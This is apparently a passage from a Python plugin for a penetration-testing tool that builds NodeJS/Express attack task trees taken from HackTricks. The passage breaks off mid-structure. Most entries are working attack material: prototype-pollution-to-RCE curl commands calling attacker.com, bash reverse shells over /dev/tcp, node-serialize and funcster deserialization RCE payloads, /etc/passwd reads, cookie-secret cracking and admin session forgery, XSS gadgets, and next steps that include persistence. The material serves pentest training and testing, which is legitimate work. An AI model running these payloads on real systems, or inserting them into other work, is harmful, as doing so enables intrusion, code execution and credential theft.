"""
NodeJS/Express service enumeration plugin

Generates tasks for NodeJS/Express enumeration including:
- Express framework detection and fingerprinting
- Prototype pollution detection (client-side and server-side)
- Prototype pollution to RCE exploitation
- Express-specific gadgets and XSS vectors
- Cookie signature testing with cookie-monster
- Package.json exposure and dependency analysis
- Debug mode detection
- NODE_OPTIONS environment variable exploitation
- NodeJS deserialization vulnerabilities (node-serialize, funcster, serialize-javascript, Cryo)
- JS magic functions exploitation (toString, valueOf, toJSON, promise.then)

Extracted from HackTricks:
- pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md (398 lines)
- pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md (786 lines)
- pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.md (130 lines)
- pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.md (189 lines)
- network-services-pentesting/pentesting-web/nodejs-express.md (42 lines)
- pentesting-web/deserialization/README.md (NodeJS section, ~160 lines)

Generated by: CrackPot v1.0
Expanded: 2025-10-07 (Phase 2 Agent 6)
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class NodeJSPlugin(ServicePlugin):
    """NodeJS/Express enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "nodejs"

    @property
    def default_ports(self) -> List[int]:
        return [3000, 8080, 8000, 5000, 4000]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect NodeJS/Express services"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info.get('port')

        # Check for NodeJS/Express in product/version
        if any(keyword in product for keyword in ['node', 'express']):
            return True

        if any(keyword in version for keyword in ['node.js', 'express']):
            return True

        # Check HTTP services on common Node.js ports
        if service in self.service_names and port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate NodeJS/Express enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        tasks = {
            'id': f'nodejs-enum-{port}',
            'name': f'NodeJS/Express Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Technology Detection
        tasks['children'].append({
            'id': f'nodejs-detect-{port}',
            'name': 'NodeJS/Express Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'nodejs-headers-{port}',
                    'name': 'Check HTTP Headers for NodeJS/Express',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -I http://{target}:{port}/',
                        'description': 'Examine HTTP response headers for X-Powered-By: Express or Server: Node.js',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-I': 'Fetch headers only (HEAD request)',
                            'http://': 'Protocol (use https:// if SSL detected)'
                        },
                        'success_indicators': [
                            'X-Powered-By: Express header present',
                            'Server: Node.js header detected',
                            'Set-Cookie with connect.sid signature'
                        ],
                        'failure_indicators': [
                            'Connection refused (wrong protocol - try HTTPS)',
                            'No NodeJS/Express indicators in headers',
                            'Generic server headers (may be hidden)'
                        ],
                        'next_steps': [
                            'Check for package.json exposure',
                            'Test for prototype pollution vulnerabilities',
                            'Examine cookie signatures if Express session detected'
                        ],
                        'alternatives': [
                            f'Manual browser: Developer Tools → Network → Headers',
                            f'nc {target} {port} (manual HTTP request)',
                            f'whatweb http://{target}:{port}',
                            f'nmap --script http-headers -p {port} {target}'
                        ],
                        'notes': 'Express default behavior includes X-Powered-By header. If missing, app.disable("x-powered-by") may have been called. Look for other indicators like connect.sid cookies or /node_modules/ exposure.'
                    }
                },
                {
                    'id': f'nodejs-package-json-{port}',
                    'name': 'Check for Exposed package.json',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl http://{target}:{port}/package.json',
                        'description': 'Attempt to retrieve package.json for dependency version disclosure',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                        'flag_explanations': {
                            '/package.json': 'NPM package manifest (contains dependencies and versions)'
                        },
                        'success_indicators': [
                            'JSON response with "dependencies" field',
                            'Version numbers for Express, lodash, etc.',
                            'Scripts section revealing build commands'
                        ],
                        'failure_indicators': [
                            '404 Not Found (good security practice)',
                            '403 Forbidden (directory listing disabled)',
                            'HTML response instead of JSON'
                        ],
                        'next_steps': [
                            'Extract dependency versions for CVE research',
                            'Check for outdated packages with known vulnerabilities',
                            'Look for prototype pollution in lodash/jQuery versions'
                        ],
                        'alternatives': [
                            f'curl http://{target}:{port}/node_modules/ (directory listing)',
                            f'Manual browser: http://{target}:{port}/package.json',
                            f'gobuster dir -u http://{target}:{port} -w /usr/share/wordlists/dirb/common.txt'
                        ],
                        'notes': 'Common with misconfigured static file serving. package.json reveals exact dependency versions for targeted exploitation. Check for: lodash < 4.17.21 (PP), jQuery < 3.5.0 (PP), express < 4.17.3 (CVEs).'
                    }
                }
            ]
        })

        # TASK 2: Prototype Pollution Detection
        tasks['children'].append({
            'id': f'nodejs-pp-detect-{port}',
            'name': 'Prototype Pollution Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'nodejs-pp-client-{port}',
                    'name': 'Client-Side Prototype Pollution Scan',
                    'type': 'command',
                    'metadata': {
                        'command': f'ppfuzz -u http://{target}:{port}',
                        'description': 'Automated client-side prototype pollution detection using ppfuzz',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'VULN_SCAN'],
                        'flag_explanations': {
                            '-u': 'Target URL to scan',
                            'ppfuzz': 'GitHub: dwisiswant0/ppfuzz - automated PP fuzzer'
                        },
                        'success_indicators': [
                            'Polluted property detected in Object.prototype',
                            'Payload: ?__proto__[test]=value worked',
                            'Constructor.prototype pollution confirmed'
                        ],
                        'failure_indicators': [
                            'No pollution detected (app may be hardened)',
                            'Tool installation missing (install: go install github.com/dwisiswant0/ppfuzz@latest)',
                            'False negatives (try manual testing)'
                        ],
                        'next_steps': [
                            'If vulnerable: Search for exploitation gadgets',
                            'Test server-side PP with JSON payloads',
                            'Check for Express-specific gadgets (see next tasks)'
                        ],
                        'alternatives': [
                            'ppmap: python3 ppmap.py -u http://{target}:{port} (GitHub: kleiton0x00/ppmap)',
                            'Browser extension: PPScan (auto-scan pages during browsing)',
                            'Manual: Inject ?__proto__[polluted]=1 and check console',
                            'Burp Suite DOM Invader: Built-in prototype pollution scanner'
                        ],
                        'notes': 'Client-side PP exploitable via URL params (?__proto__[key]=value), location.hash (#__proto__[key]=value), or postMessage. Modern tools: ppfuzz 2.0 (2025) supports ES-modules/HTTP2. Install: go install github.com/dwisiswant0/ppfuzz@latest'
                    }
                },
                {
                    'id': f'nodejs-pp-server-{port}',
                    'name': 'Server-Side Prototype Pollution Test',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -X POST http://{target}:{port}/endpoint -H "Content-Type: application/json" -d \'{{"__proto__": {{"polluted": "test"}}}}\'',
                        'description': 'Test for server-side prototype pollution via JSON POST requests',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'flag_explanations': {
                            '-X POST': 'Send POST request',
                            '-H "Content-Type: application/json"': 'Set JSON content type',
                            '-d': 'POST data payload',
                            '__proto__': 'Prototype pollution vector (modifies Object.prototype)',
                            'polluted': 'Test property to detect successful pollution'
                        },
                        'success_indicators': [
                            'Property reflected in response',
                            'Application behavior change detected',
                            'Error revealing polluted property exists',
                            'JSON spaces gadget: {"foo":  "bar"} with extra space'
                        ],
                        'failure_indicators': [
                            'Request returns 400 Bad Request',
                            'No behavioral change',
                            'Input validation/sanitization in place',
                            'Object.freeze(Object.prototype) protection active'
                        ],
                        'next_steps': [
                            'If vulnerable: Test PP to RCE via NODE_OPTIONS',
                            'Try Express-specific gadgets (content-type manipulation)',
                            'Fuzz for vulnerable merge/clone functions'
                        ],
                        'alternatives': [
                            'Burp extension: Server-Side-Prototype-Pollution-Gadgets-Scanner',
                            'Manual: constructor.prototype pollution: {"constructor":{"prototype":{"test":"value"}}}',
                            'Batch testing with multiple endpoints',
                            'Try nested pollution: {"a":{"b":{"__proto__":{"polluted":"1"}}}}'
                        ],
                        'notes': 'Server-side PP occurs in vulnerable merge/clone/extend functions (lodash < 4.17.21, jQuery $.extend). Exploitable when app uses recursive merge without sanitization. Common sinks: child_process.spawn(), vm.runInContext(). Detection: Send {"__proto__":{"json spaces":" "}} and check if JSON response has extra spacing.'
                    }
                },
                {
                    'id': f'nodejs-pp-gadget-scan-{port}',
                    'name': 'Scan for Express Prototype Pollution Gadgets',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test Express-specific PP gadgets for XSS and behavioral changes',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH'],
                        'success_indicators': [
                            'Content-Type changed to HTML (XSS vector)',
                            'Status code modification confirmed',
                            'CORS headers added via exposedHeaders gadget'
                        ],
                        'failure_indicators': [
                            'No behavioral change',
                            'App not using affected Express modules'
                        ],
                        'next_steps': [
                            'Combine gadgets for exploit chain',
                            'Document all working gadgets for exploitation phase'
                        ],
                        'alternatives': [
                            'Payload 1 - Change JSON to HTML: {"__proto__":{"_body":true,"body":"<script>alert(1)</script>"}}',
                            'Payload 2 - UTF-7 XSS: {"__proto__":{"content-type":"application/json; charset=utf-7"}}',
                            'Payload 3 - JSON spaces (detection): {"__proto__":{"json spaces":" "}}',
                            'Payload 4 - Exposed Headers (CORS): {"__proto__":{"exposedHeaders":["X-Test"]}}',
                            'Payload 5 - Status code: {"__proto__":{"status":510}}',
                            'Payload 6 - Allow dots (query params): {"__proto__":{"allowDots":true}}'
                        ],
                        'notes': 'Express gadgets work when app uses res.send(obj) with polluted Object.prototype. XSS gadget (_body + body) requires application/json content type. Test on different endpoints. UTF-7 bypass may work for older browsers. Status code gadget useful for fingerprinting successful pollution.'
                    }
                }
            ]
        })

        # TASK 3: Prototype Pollution to RCE
        tasks['children'].append({
            'id': f'nodejs-pp-rce-{port}',
            'name': 'Prototype Pollution to RCE',
            'type': 'parent',
            'children': [
                {
                    'id': f'nodejs-pp-rce-environ-{port}',
                    'name': 'PP2RCE via NODE_OPTIONS + /proc/self/environ',
                    'type': 'command',
                    'metadata': {
                        'command': f'''curl -X POST http://{target}:{port}/endpoint -H "Content-Type: application/json" -d '{{"__proto__": {{"NODE_OPTIONS": "--require /proc/self/environ", "env": {{"EVIL":"console.log(require('child_process').execSync('curl http://attacker.com/rce').toString())//"}}}}}}' ''',
                        'description': 'Exploit PP to RCE by poisoning NODE_OPTIONS env var (Linux only)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'LINUX'],
                        'flag_explanations': {
                            'NODE_OPTIONS': 'Node.js CLI flags passed via environment variable',
                            '--require': 'Preload a module before app starts',
                            '/proc/self/environ': 'Process environment variables file (contains EVIL payload)',
                            'env': 'Pollutes environment variables passed to child_process.fork/spawn',
                            'EVIL': 'Custom env var containing JavaScript RCE payload',
                            '//': 'Comment to prevent syntax errors'
                        },
                        'success_indicators': [
                            'HTTP request received at attacker server',
                            'Command executed on target',
                            'File created at /tmp/pp2rce',
                            'Reverse shell connection received'
                        ],
                        'failure_indicators': [
                            'No child_process spawn after pollution',
                            'kEmptyObject protection (Node >= 18.4.0 patched)',
                            'Windows target (use cmdline or Windows-specific technique)',
                            'Environment variable sanitization in place'
                        ],
                        'next_steps': [
                            'Replace curl with reverse shell payload',
                            'Upgrade to interactive shell',
                            'Establish persistence'
                        ],
                        'alternatives': [
                            'cmdline variant: {"__proto__":{"NODE_OPTIONS":"--require /proc/self/cmdline","argv0":"console.log(require(\\"child_process\\").execSync(\\"id\\").toString())//"}}',
                            '--import variant (Node >= 19): {"__proto__":{"NODE_OPTIONS":"--import data:text/javascript;base64,<BASE64_PAYLOAD>"}}',
                            'execArgv (fork only): {"__proto__":{"execPath":"/bin/sh","argv0":"/bin/sh","execArgv":["-c","bash -i >& /dev/tcp/attacker.com/4444 0>&1"]}}',
                            'Windows: {"__proto__":{"shell":"\\\\\\\\127.0.0.1\\\\C$\\\\Windows\\\\System32\\\\calc.exe"}}'
                        ],
                        'notes': 'PP2RCE requires: (1) Prototype pollution vulnerability, (2) Application calls child_process.fork/spawn/exec after pollution. Works by polluting env vars passed to spawned processes. NODE_OPTIONS forces Node to require malicious code from /proc/self/environ. Patched in Node >= 18.4.0 with kEmptyObject but still exploitable if app provides options object. Filesystem-less variant with --import (Node >= 19) embeds payload in data: URI.'
                    }
                },
                {
                    'id': f'nodejs-pp-rce-import-{port}',
                    'name': 'PP2RCE via --import (Node >= 19, Filesystem-less)',
                    'type': 'command',
                    'metadata': {
                        'command': f'''echo "require('child_process').execSync('touch /tmp/pp2rce_import')" | base64 | xargs -I {{}} curl -X POST http://{target}:{port}/endpoint -H "Content-Type: application/json" -d '{{"__proto__":{{"NODE_OPTIONS":"--import data:text/javascript;base64,{{}}"}}}}' ''',
                        'description': 'Exploit PP2RCE using --import with data URI (no filesystem access required, Node >= 19)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'ADVANCED'],
                        'flag_explanations': {
                            '--import': 'ESM module preload (Node >= 19, works in NODE_OPTIONS)',
                            'data:text/javascript;base64,': 'Data URI for inline JavaScript code',
                            'base64': 'Encode payload to avoid special char issues',
                            'xargs -I {}': 'Substitute base64 output into curl command'
                        },
                        'success_indicators': [
                            'File /tmp/pp2rce_import created',
                            'Code executed without touching filesystem',
                            'Works on read-only environments'
                        ],
                        'failure_indicators': [
                            'Node version < 19 (--import not supported)',
                            'NODE_OPTIONS --import blocked by allowlist',
                            'Base64 decode error'
                        ],
                        'next_steps': [
                            'Replace touch with reverse shell',
                            'Payload: bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',
                            'Encode full exploit in base64'
                        ],
                        'alternatives': [
                            'Manual base64 encoding: echo -n "CODE" | base64',
                            'Payload example: --import data:text/javascript;base64,cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcp',
                            'DNS exfil: {"__proto__":{"NODE_OPTIONS":"--inspect=<ATTACKER>.oastify.com"}}',
                            'WAF bypass: --inspect=id"".oastify"".com (quote splitting)'
                        ],
                        'notes': 'Best PP2RCE method for Node >= 19. Advantages: (1) No disk write required, (2) Bypasses some --require allowlists, (3) Works in containerized/read-only environments. Confirmed working in Node 22.2.0 (June 2025). Node team discussing restrictions but no mitigation yet. First documented by PortSwigger May 2023.'
                    }
                },
                {
                    'id': f'nodejs-pp-rce-require-hijack-{port}',
                    'name': 'PP2RCE via require() Hijacking',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit PP by hijacking require() paths to load malicious modules',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'ADVANCED'],
                        'success_indicators': [
                            'require() loads attacker-controlled file',
                            'RCE achieved via malicious module',
                            'Works without child_process spawn'
                        ],
                        'failure_indicators': [
                            'No require() call after pollution',
                            'Require path not controllable',
                            'Cannot upload malicious .js file'
                        ],
                        'next_steps': [
                            'Upload malicious.js with child_process.fork() call',
                            'Trigger require() to load it',
                            'Achieve RCE when module is imported'
                        ],
                        'alternatives': [
                            'Absolute require hijack: {"__proto__":{"main":"/tmp/malicious.js"}} + require("bytes")',
                            'Relative require hijack 1: {"__proto__":{"exports":{".":"./malicious.js"},"1":"/tmp"}}',
                            'Relative require hijack 2: {"__proto__":{"data":{"exports":{".":"./malicious.js"}},"path":"/tmp","name":"./target.js"}}',
                            'Find system .js calling spawn: /node_modules/npm/scripts/changelog.js, /opt/yarn-v1.22.19/preinstall.js',
                            'Search command: find / -name "*.js" -exec grep -l "child_process" {} \\; 2>/dev/null'
                        ],
                        'notes': 'Attack flow: (1) Pollute require path resolution, (2) Find/upload .js file calling child_process, (3) Pollute NODE_OPTIONS, (4) Trigger require(). Useful when direct spawn not available but app uses require() after pollution. malicious.js template: const {fork}=require("child_process");fork("anything");'
                    }
                }
            ]
        })

        # TASK 4: Express Cookie Signature Testing
        tasks['children'].append({
            'id': f'nodejs-cookie-{port}',
            'name': 'Express Cookie Signature Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'nodejs-cookie-monster-single-{port}',
                    'name': 'Test Single Cookie with cookie-monster',
                    'type': 'command',
                    'metadata': {
                        'command': 'cookie-monster -c <COOKIE_VALUE> -s <SIGNATURE> -n session',
                        'description': 'Brute-force Express cookie secret to forge session cookies',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'MANUAL'],
                        'flag_explanations': {
                            '-c': 'Base64-encoded cookie value (from connect.sid)',
                            '-s': 'Cookie signature to crack',
                            '-n': 'Cookie name (typically "session" or "connect.sid")',
                            'cookie-monster': 'Tool: github.com/DigitalInterruption/cookie-monster'
                        },
                        'success_indicators': [
                            'Secret found: [secret]',
                            'Can now forge arbitrary session cookies',
                            'Admin session achievable'
                        ],
                        'failure_indicators': [
                            'No match found (strong/random secret)',
                            'Tool not installed (npm install -g cookie-monster)',
                            'Invalid cookie format'
                        ],
                        'next_steps': [
                            'Forge admin cookie: cookie-monster -e -f admin.json -k <SECRET>',
                            'Replace session cookie in browser',
                            'Access privileged functionality'
                        ],
                        'alternatives': [
                            'Custom wordlist: cookie-monster -c <COOKIE> -s <SIG> -w custom.lst',
                            'Batch mode: cookie-monster -b -f cookies.json',
                            'Manual verification: node -e "const s=require(\'cookie-signature\');console.log(s.sign(\'value\',\'secret\'))"'
                        ],
                        'notes': 'Express sessions use connect.sid cookie with HMAC signature. Format: s:<value>.<signature>. Extract: value = eyJmb..., signature = LVMVxSNPdU.... Default secrets often weak (\'secret\', app name, etc.). Tool: npm install -g cookie-monster. Once secret cracked, forge arbitrary sessions including admin privileges.'
                    }
                },
                {
                    'id': f'nodejs-cookie-extract-{port}',
                    'name': 'Extract Express Cookie for Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract connect.sid cookie value and signature from HTTP response',
                        'tags': ['QUICK_WIN', 'MANUAL'],
                        'success_indicators': [
                            'Cookie extracted: s:<value>.<signature>',
                            'Value and signature separated',
                            'Ready for cookie-monster attack'
                        ],
                        'failure_indicators': [
                            'No connect.sid cookie present',
                            'Cookie format unexpected',
                            'Session not using Express defaults'
                        ],
                        'next_steps': [
                            'Run cookie-monster with extracted values',
                            'Test with common secret wordlist'
                        ],
                        'alternatives': [
                            'Browser DevTools: Application → Cookies',
                            'curl -I http://{target}:{port} | grep Set-Cookie',
                            'Burp Suite: Proxy → HTTP History → Set-Cookie header',
                            'Python: print(requests.get(url).cookies.get("connect.sid"))'
                        ],
                        'notes': 'Express default cookie format: connect.sid=s%3A<value>.<signature>. URL-decode first. Value is base64-encoded JSON session data. Signature is HMAC-SHA256 of value + secret. If app uses custom cookie name, grep for s: prefix.'
                    }
                }
            ]
        })

        # TASK 5: Debug Mode & Developer Tools Detection
        tasks['children'].append({
            'id': f'nodejs-debug-{port}',
            'name': 'Debug Mode & Developer Endpoints',
            'type': 'parent',
            'children': [
                {
                    'id': f'nodejs-debug-protocol-{port}',
                    'name': 'Check for Node.js Debug Protocol',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -p 9229,9230 {target}',
                        'description': 'Scan for Node.js inspector/debugger ports (default 9229, 9230)',
                        'tags': ['OSCP:MEDIUM', 'RECON', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-p 9229,9230': 'Node.js default debug ports',
                            '9229': 'Node.js --inspect default port',
                            '9230': 'Node.js --inspect-brk port'
                        },
                        'success_indicators': [
                            'Port 9229 or 9230 open',
                            'WebSocket debugger accessible',
                            'Can attach Chrome DevTools'
                        ],
                        'failure_indicators': [
                            'Ports closed/filtered',
                            'Debug mode disabled in production',
                            'Firewall blocking access'
                        ],
                        'next_steps': [
                            'Connect Chrome DevTools: chrome://inspect',
                            'Execute arbitrary code via debugger console',
                            'Extract source code, environment variables, secrets'
                        ],
                        'alternatives': [
                            'Manual: nc {target} 9229 (check WebSocket upgrade)',
                            'Chrome: Navigate to chrome://inspect → Configure → Add target',
                            'CLI: node inspect {target}:9229',
                            'Detection via --inspect in process listing'
                        ],
                        'notes': 'Node.js debug protocol allows full RCE if exposed. Common in development/staging. Access via Chrome DevTools or node inspect. Can: execute JS, read env vars, modify code. Often exposed on 0.0.0.0:9229 by mistake. Launch: node --inspect=0.0.0.0:9229 app.js (DANGEROUS).'
                    }
                },
                {
                    'id': f'nodejs-sourcemap-{port}',
                    'name': 'Check for Exposed Source Maps',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl http://{target}:{port}/main.js.map',
                        'description': 'Attempt to retrieve JavaScript source maps for code analysis',
                        'tags': ['OSCP:LOW', 'RECON'],
                        'flag_explanations': {
                            '.map': 'Source map file extension (maps minified to original source)',
                            'main.js.map': 'Common compiled bundle source map'
                        },
                        'success_indicators': [
                            'JSON source map returned',
                            'Original source code visible',
                            'File paths and function names exposed'
                        ],
                        'failure_indicators': [
                            '404 Not Found (maps not deployed)',
                            'Source maps disabled in production'
                        ],
                        'next_steps': [
                            'Analyze original source for vulnerabilities',
                            'Identify API endpoints, secrets, logic flaws'
                        ],
                        'alternatives': [
                            'Check HTML for //# sourceMappingURL= comments',
                            'Try: app.js.map, bundle.js.map, vendor.js.map',
                            'Tool: sourcemapper (extract and deobfuscate)'
                        ],
                        'notes': 'Source maps reveal original code in production. Security risk: exposes internal logic, comments, debug code. Check webpack/vite/rollup build output. Disable in production: devtool: false (webpack).'
                    }
                }
            ]
        })

        # TASK 6: Dependency Vulnerability Research
        if version or product:
            search_term = f"{product} {version}".strip()
            tasks['children'].append({
                'id': f'nodejs-cve-{port}',
                'name': f'Vulnerability Research: {search_term}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'nodejs-searchsploit-{port}',
                        'name': f'SearchSploit: {search_term}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{search_term}" node.js express',
                            'description': 'Search ExploitDB for known NodeJS/Express vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH', 'QUICK_WIN'],
                            'flag_explanations': {
                                'searchsploit': 'Local ExploitDB search tool',
                                'node.js express': 'Additional search terms'
                            },
                            'success_indicators': [
                                'Exploits found for target version',
                                'PoC code available',
                                'CVE references listed'
                            ],
                            'failure_indicators': [
                                'No results found',
                                'Version too new/old for database'
                            ],
                            'next_steps': [
                                'Review exploit code: searchsploit -x <EDB-ID>',
                                'Test exploit against target',
                                'Search for additional CVEs online'
                            ],
                            'alternatives': [
                                'Online: exploit-db.com',
                                'npm audit (if package.json obtained)',
                                'Snyk vulnerability database',
                                'GitHub Advisory Database'
                            ],
                            'notes': 'Common NodeJS CVEs: Express < 4.17.3 (qs DoS), lodash < 4.17.21 (PP), cookie-parser < 1.4.6 (secret leak). Always check package.json dependencies for outdated libs.'
                        }
                    },
                    {
                        'id': f'nodejs-npm-audit-{port}',
                        'name': 'NPM Audit (if package.json obtained)',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Run npm audit on obtained package.json for automated vulnerability detection',
                            'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                            'success_indicators': [
                                'Vulnerabilities detected with severity levels',
                                'CVE IDs and remediation advice provided',
                                'Exploit paths identified'
                            ],
                            'failure_indicators': [
                                'package.json not obtained',
                                'No vulnerabilities found',
                                'npm not installed'
                            ],
                            'next_steps': [
                                'Research high/critical severity CVEs',
                                'Test vulnerable packages for exploitation',
                                'Check for public PoCs'
                            ],
                            'alternatives': [
                                'Save package.json locally → npm install → npm audit',
                                'Online: snyk.io/test/ (paste package.json)',
                                'yarn audit (alternative to npm audit)',
                                'OWASP Dependency-Check'
                            ],
                            'notes': 'npm audit checks dependencies against public vulnerability DB. Severity levels: critical (RCE), high (sensitive data), moderate (DoS), low (info leak). Focus on: prototype pollution, deserialization, RCE. Common: lodash, minimist, qs, dot-prop.'
                        }
                    }
                ]
            })

        # TASK 7: Client-Side PP Gadget Testing
        tasks['children'].append({
            'id': f'nodejs-client-pp-gadgets-{port}',
            'name': 'Client-Side Prototype Pollution Gadget Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test browser-native PP gadgets for XSS without app-specific gadgets',
                'tags': ['OSCP:LOW', 'ADVANCED', 'RESEARCH'],
                'success_indicators': [
                    'alert() executed via polluted property',
                    'XSS confirmed in browser',
                    'Universal gadget found (works on any page)'
                ],
                'failure_indicators': [
                    'No XSS achieved',
                    'Browser protections block execution',
                    'App uses Object.freeze(Object.prototype)'
                ],
                'next_steps': [
                    'Craft exploit URL with gadget payload',
                    'Test across different browsers',
                    'Combine with server-side findings'
                ],
                'alternatives': [
                    'URL() gadget: ?__proto__[href]=javascript:alert(1) → new URL("#")',
                    'Notification gadget: Object.prototype.title="XSS" → new Notification()',
                    'Worker gadget: Object.prototype.name="evil.js" → new Worker()',
                    'Image gadget: Object.prototype.src="x" Object.prototype.onerror=alert → new Image()',
                    'URLSearchParams: Object.prototype.toString="javascript:alert(1)"'
                ],
                'notes': 'Modern browsers (2023+) have built-in PP-to-XSS gadgets. No app code needed. Works if: (1) Can pollute via URL params, (2) App uses affected constructors. PortSwigger research (2023) found 11 universal gadgets. Test in Chrome/Firefox/Safari. Defense: Object.freeze(Object.prototype) before any code runs.'
            }
        })

        # TASK 8: NodeJS Deserialization Vulnerabilities
        tasks['children'].append({
            'id': f'nodejs-deserial-{port}',
            'name': 'NodeJS Deserialization Vulnerabilities',
            'type': 'parent',
            'children': [
                {
                    'id': f'nodejs-magic-functions-{port}',
                    'name': 'Test JS Magic Functions (toString, valueOf, toJSON)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for exploitable JS magic functions during deserialization',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ADVANCED'],
                        'success_indicators': [
                            'toString/valueOf/toJSON executed without direct call',
                            'Code execution via promise.then() hijacking',
                            'Object transformation triggers execution'
                        ],
                        'failure_indicators': [
                            'Magic functions not called during deserialization',
                            'App uses safe deserialization methods',
                            'No object manipulation possible'
                        ],
                        'next_steps': [
                            'Combine with prototype pollution',
                            'Test async function promise hijacking',
                            'Chain with other vulnerabilities'
                        ],
                        'alternatives': [
                            'Payload 1 - toString: {"__proto__":{"toString":"console.log(\\"RCE\\")"}}',
                            'Payload 2 - valueOf: {"valueOf":"require(\\"child_process\\").exec(\\"id\\")"}}',
                            'Payload 3 - toJSON: {"toJSON":"function(){return require(\\"fs\\").readFileSync(\\"/etc/passwd\\")}"}}',
                            'Payload 4 - promise.then: {"then":"function(resolve){require(\\"child_process\\").exec(\\"id\\")}"}}',
                            'Reference: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/'
                        ],
                        'notes': 'JS lacks PHP/Python-style magic methods but toString/valueOf/toJSON are auto-called. Promise hijacking: If async function returns object with "then" property (function), it auto-executes. Exploit: Replace returned promise with malicious then() function. Works without direct function call.'
                    }
                },
                {
                    'id': f'nodejs-node-serialize-{port}',
                    'name': 'Test node-serialize Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for node-serialize library RCE via function deserialization',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Serialized function executed',
                            'RCE via _$$ND_FUNC$$_ flag',
                            'Command output received'
                        ],
                        'failure_indicators': [
                            'node-serialize not in use',
                            'Input validation blocks payload',
                            'Function serialization disabled'
                        ],
                        'next_steps': [
                            'Use IIFE syntax for auto-execution: }()',
                            'Test with require("child_process").exec()',
                            'Upgrade to reverse shell'
                        ],
                        'alternatives': [
                            'Payload 1 - Auto-exec with IIFE: {"rce":"_$$ND_FUNC$$_function(){ require(\\"child_process\\").exec(\\"ls /\\") }()"}',
                            'Payload 2 - Direct exec (no function wrapper): {"rce":"_$$ND_FUNC$$_require(\\"child_process\\").exec(\\"id\\")"}',
                            'Payload 3 - Reverse shell: {"rce":"_$$ND_FUNC$$_require(\\"child_process\\").exec(\\"bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'\\")"}',
                            'Detection: Look for _$$ND_FUNC$$_ in requests/cookies',
                            'Library: npm install node-serialize'
                        ],
                        'notes': 'node-serialize serializes functions with _$$ND_FUNC$$_ flag. Uses eval() to deserialize. Exploit: Add () after function to auto-execute (IIFE). Or remove function wrapper entirely. Check cookies/session storage for serialized data. Source: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/'
                    }
                },
                {
                    'id': f'nodejs-funcster-{port}',
                    'name': 'Test funcster Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for funcster library RCE via constructor escape',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'RCE via this.constructor.constructor()',
                            'Bypassed restricted context',
                            'Access to built-in objects restored'
                        ],
                        'failure_indicators': [
                            'funcster not in use',
                            'Constructor access blocked',
                            'Strict CSP prevents execution'
                        ],
                        'next_steps': [
                            'Use this.constructor.constructor() to escape sandbox',
                            'Execute require() in restored context',
                            'Chain with other vulnerabilities'
                        ],
                        'alternatives': [
                            'Payload 1 - Basic RCE: {"__js_function":"this.constructor.constructor(\\"console.log(1111)\\")()"}',
                            'Payload 2 - Command execution: {"__js_function":"this.constructor.constructor(\\"require(\'child_process\').exec(\'id\')\\")()"}',
                            'Payload 3 - File read: {"__js_function":"this.constructor.constructor(\\"return require(\'fs\').readFileSync(\'/etc/passwd\')\\")()"}',
                            'Detection: Look for __js_function in serialized data',
                            'Library: npm install funcster'
                        ],
